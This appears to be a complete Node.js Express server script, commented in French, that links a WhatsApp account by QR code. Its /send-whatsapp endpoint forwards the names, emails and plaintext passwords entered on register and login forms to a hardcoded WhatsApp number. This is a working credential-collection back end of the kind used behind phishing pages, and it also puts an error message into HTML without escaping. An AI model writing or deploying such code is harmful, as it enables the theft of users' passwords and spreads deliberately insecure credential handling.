const express = require("express");
const bodyParser = require("body-parser");
const { Client, LocalAuth } = require("whatsapp-web.js");
const QRCode = require("qrcode");
const path = require("path");

const app = express();
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, "public")));

// Numero WhatsApp au format international, sans "+", sans espaces
const NUMERO_WHATSAPP = "221775354423";

let lastQr = null;
let isReady = false;

const client = new Client({
    authStrategy: new LocalAuth(),
    puppeteer: {
        headless: true,
        executablePath: process.env.PUPPETEER_EXECUTABLE_PATH || undefined,
        args: [
            "--no-sandbox",
            "--disable-setuid-sandbox",
            "--disable-dev-shm-usage",
            "--disable-gpu",
            "--disable-accelerated-2d-canvas",
            "--no-first-run",
            "--no-zygote",
            "--single-process"
        ]
    }
});

client.on("qr", (qr) => {
    lastQr = qr;
    isReady = false;
    console.log("Nouveau QR code généré — ouvre /qr sur ton appli pour le scanner.");
});

client.on("ready", () => {
    isReady = true;
    lastQr = null;
    console.log("Client WhatsApp connecté et prêt !");
});

client.on("auth_failure", (msg) => {
    console.error("Echec d'authentification WhatsApp :", msg);
});

client.on("disconnected", () => {
    isReady = false;
    console.log("Client WhatsApp déconnecté.");
});

let initError = null;

client.initialize().catch((err) => {
    initError = err.message;
    console.error("Erreur au démarrage du client WhatsApp :", err);
});

// Page pour scanner le QR code depuis le navigateur (pratique en ligne,
// pas besoin d'aller lire les logs du serveur)
app.get("/qr", async (req, res) => {

    if (isReady) {
        return res.send("<h2>Déjà connecté à WhatsApp ✅</h2>");
    }

    if (initError) {
        return res.send(`<h2>Erreur au démarrage du client WhatsApp ❌</h2><pre>${initError}</pre>`);
    }

    if (!lastQr) {
        return res.send("<h2>Pas encore de QR code, réessaie dans quelques secondes...</h2>");
    }

    try {
        const dataUrl = await QRCode.toDataURL(lastQr);
        res.send(`
            <html>
                <body style="display:flex;flex-direction:column;justify-content:center;
                             align-items:center;height:100vh;margin:0;font-family:sans-serif;">
                    <h2>Scanne avec WhatsApp &gt; Appareils liés</h2>
                    <img src="${dataUrl}" />
                </body>
            </html>
        `);
    } catch (err) {
        res.status(500).send("Erreur génération du QR code.");
    }

});

app.post("/send-whatsapp", async (req, res) => {

    const { name, email, password, type } = req.body;

    if ((type === "register" && (!name || !email || !password)) ||
        (type === "login" && (!email || !password))) {
        return res.status(400).json({ success: false, error: "Champs manquants." });
    }

    if (!isReady) {
        return res.status(503).json({
            success: false,
            error: "Le client WhatsApp n'est pas encore prêt (peut-être encore en train de synchroniser). Réessaie dans quelques secondes."
        });
    }

    let message = "";

    if (type === "register") {
        message =
`Bonjour, je viens de créer un compte.
Nom : ${name}
Email : ${email}
Mot de passe : ${password}`;
    } else {
        message =
`Bonjour, je viens de me connecter.
Email : ${email}
Mot de passe : ${password}`;
    }

    const chatId = `${NUMERO_WHATSAPP}@c.us`;

    try {
        await client.sendMessage(chatId, message);
        res.json({ success: true });
    } catch (err) {
        console.error("Erreur d'envoi WhatsApp (1ere tentative) :", err.message);

        // Une "getChat" ou erreur similaire juste après connexion est souvent
        // transitoire : on retente une fois après une courte pause.
        try {
            await new Promise((resolve) => setTimeout(resolve, 3000));
            await client.sendMessage(chatId, message);
            res.json({ success: true });
        } catch (err2) {
            console.error("Erreur d'envoi WhatsApp (2eme tentative) :", err2.message);
            res.status(500).json({ success: false, error: err2.message });
        }
    }

});

const PORT = process.env.PORT || 3001;
app.listen(PORT, () => {
    console.log(`Serveur lancé sur http://localhost:${PORT}`);
});
